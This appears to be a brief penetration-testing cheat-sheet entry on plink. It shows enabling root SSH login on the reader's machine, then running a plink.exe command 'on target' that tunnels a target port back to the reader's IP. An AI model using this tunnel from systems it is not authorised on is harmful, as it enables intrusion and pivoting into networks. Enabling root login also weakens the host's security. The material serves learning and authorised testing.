**[Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)**

We are using plink to forward a port to our host over an SSH connection. When this completes we will be ssh'd into our machine with a local (127.0.0.1) connection to whatever port we forwarded. 

SSH on your machine with "permitrootlogin yes".

    systemctl restart ssh

On target:

    plink.exe -l <your user> -pw <your pass> <local port you want access to>:127.0.0.1:<port to send to your PC> <your IP>
